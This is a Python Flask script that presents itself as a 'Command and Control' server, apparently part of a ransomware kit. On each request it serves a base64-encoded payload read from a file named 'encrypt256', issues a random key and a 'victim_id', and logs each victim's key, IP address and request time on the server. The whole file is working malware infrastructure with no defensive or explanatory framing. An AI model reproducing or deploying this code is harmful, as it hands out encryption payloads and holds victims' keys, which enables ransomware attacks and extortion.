#!/bin/python3

from flask import Flask, render_template_string, request
import base64
import hashlib
import uuid
import datetime

app = Flask(__name__)
log_file_path = 'request_log.txt'

@app.route('/')
def index():
	with open('encrypt256', 'rb') as file:
		file_content = file.read()
	encoded_content = base64.b64encode(file_content).decode('utf-8')

	with open("/dev/random", "rb") as random_file:
		random_key = random_file.read(32)
	key_hex = random_key.hex()

	id = str(uuid.uuid4())
   
	#hash = hashlib.sha256(id.encode())
	#hash_hex = hash.hexdigest()

	client_ip = request.remote_addr
	request_time = datetime.datetime.now().strftime('%H:%M:%S %d-%m-%y')
	log_entry = f"{id} {key_hex} {client_ip} {request_time}\n"

	with open(log_file_path, 'a') as log_file:
		log_file.write(log_entry)

	html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="CC" content="width=device-width, initial-scale=1.0">
        <title>Command and Control</title>
    </head>
    <body>
        <h1>Base64 Encoded Content of the Python File:</h1>
        <pre>{{ encoded_file }}</pre>

        <h2>Unique key for this Request:</h2>
        <p id="key">{{ key }}</p>
        <h2>Unique id for this Request:</h2>
        <p id="victim_id">{{ id }}</p>
    </body>
    </html>
    """

	return render_template_string(html_content, encoded_file=encoded_content, key=key_hex, id=id)

if __name__ == '__main__':
    app.run(host='10.0.0.254', port=80)
